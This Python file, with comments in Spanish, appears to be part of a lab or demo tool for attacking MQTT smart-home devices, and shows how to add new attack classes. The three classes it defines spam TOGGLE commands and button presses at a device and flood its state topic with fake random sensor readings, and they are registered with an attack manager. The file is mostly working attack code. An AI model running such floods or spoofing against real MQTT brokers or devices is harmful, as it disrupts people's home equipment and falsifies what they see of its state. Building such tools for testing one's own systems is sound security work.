# Ejemplo de cómo agregar nuevos ataques sin modificar routes.py

from attacks import BaseAttack, AttackManager
from config import MQTT_SET_TOPIC, MQTT_STATE_TOPIC, MQTT_BUTTON_TOPIC
from mqtt_service import publish_to_topic


class Attack4(BaseAttack):
    """Ataque 4: Spam de comandos TOGGLE cada 0.5 segundos."""
    
    def __init__(self):
        super().__init__('attack4', 'ATAQUE 4 - TOGGLE SPAM', 0.5)
    
    def execute_attack(self):
        return publish_to_topic(MQTT_SET_TOPIC, {'state': 'TOGGLE'})


class Attack5(BaseAttack):
    """Ataque 5: Spam de botones cada 0.2 segundos."""
    
    def __init__(self):
        super().__init__('attack5', 'ATAQUE 5 - BUTTON SPAM', 0.2)
    
    def execute_attack(self):
        return publish_to_topic(MQTT_BUTTON_TOPIC, {'action': 'single'})


class Attack6(BaseAttack):
    """Ataque 6: Flood de mensajes de estado falsos con datos aleatorios."""
    
    def __init__(self):
        super().__init__('attack6', 'ATAQUE 6 - DATA FLOOD', 0.05)
    
    def execute_attack(self):
        import random
        fake_data = {
            'state': random.choice(['ON', 'OFF']),
            'linkquality': random.randint(1, 255),
            'temperature': random.randint(-10, 50),
            'fake_field': f'malicious_data_{random.randint(1000, 9999)}'
        }
        return publish_to_topic(MQTT_STATE_TOPIC, fake_data)


# Para registrar los nuevos ataques, simplemente:
def register_new_attacks():
    """Registra todos los nuevos ataques automáticamente."""
    manager = AttackManager()
    
    # Registrar nuevos ataques
    manager.register_attack(Attack4())
    manager.register_attack(Attack5())
    manager.register_attack(Attack6())
    
    print("✅ Nuevos ataques registrados:")
    for attack_id, name in manager.get_available_attacks().items():
        print(f"  - {attack_id}: {name}")


# Llamar esta función al iniciar la aplicación
if __name__ == "__main__":
    register_new_attacks()